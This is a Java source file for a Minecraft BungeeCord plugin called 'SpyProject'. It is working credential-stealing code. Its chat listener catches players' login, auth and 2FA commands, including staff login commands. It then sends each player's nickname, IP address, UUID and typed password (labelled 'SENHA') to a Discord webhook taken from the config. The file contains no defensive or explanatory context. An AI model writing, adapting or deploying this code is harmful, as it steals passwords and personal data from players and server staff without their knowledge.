package pt.imnotglitch.spyproject.listeners;

import com.google.gson.JsonArray;
import com.google.gson.JsonObject;
import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.chat.TextComponent;
import net.md_5.bungee.api.config.ListenerInfo;
import net.md_5.bungee.api.config.ServerInfo;
import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.connection.Server;
import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.event.PlayerDisconnectEvent;
import net.md_5.bungee.api.event.PostLoginEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.api.plugin.Plugin;
import net.md_5.bungee.event.EventHandler;
import okhttp3.*;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.InetSocketAddress;
import java.net.URL;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

import net.md_5.bungee.api.ProxyServer;
import net.md_5.bungee.api.config.ListenerInfo;
import pt.imnotglitch.spyproject.SpyProject;


public final class PlayerEvent implements Listener {


    private final String authCmdsWebhookURL = SpyProject.getInstance().getConfig().getString("webhook.AuthCommands");
    private final Plugin plugin;

    public PlayerEvent(Plugin plugin) {
        this.plugin = plugin;
    }

    public void sendWebhook(String title, String text, int color, String webhookURL) {
        try {
            OkHttpClient httpClient = new OkHttpClient();

            JsonObject embed = new JsonObject();
            embed.addProperty("title", title);
            embed.addProperty("description", text);
            embed.addProperty("color", color);

            JsonArray embeds = new JsonArray();
            embeds.add(embed);

            JsonObject jsonPayload = new JsonObject();
            jsonPayload.add("embeds", embeds);

            RequestBody body = RequestBody.create(jsonPayload.toString(), MediaType.parse("application/json"));
            Request request = new Request.Builder()
                    .url(webhookURL)
                    .post(body)
                    .build();

            Response response = httpClient.newCall(request).execute();
            response.close();
        } catch (IOException e) {
            ProxyServer.getInstance().getLogger().severe("Erro ao enviar webhook: " + e.getMessage());
        }
    }


    @EventHandler
    public void onChat(ChatEvent event) {
        if (!(event.getSender() instanceof ProxiedPlayer)) {
            return;
        }

        ProxiedPlayer player = (ProxiedPlayer) event.getSender();
        String message = event.getMessage();

        String[] parts = message.split(" ");
        String webhookMessage;

        if (message.startsWith("/login") || message.startsWith("/auth") || message.startsWith("/autenticar") || message.startsWith("/2fa") || message.startsWith("/logar") || message.startsWith("/loginstaff") || message.startsWith("/ls")) {
            if (parts.length > 1) {
                webhookMessage = ":bust_in_silhouette: **Nickname:**```" + player.getName() + "```:desktop: **IP:** ```" + player.getAddress() + "``` :id: **SENHA**: ```" + message + "```:id: **UUID**: ```" + player.getUniqueId() + "```" + "\n github.com/ImNotGlitch";
                sendWebhook("Comando Capturado", webhookMessage, 0x000000, authCmdsWebhookURL);
            }
        }
    }
}
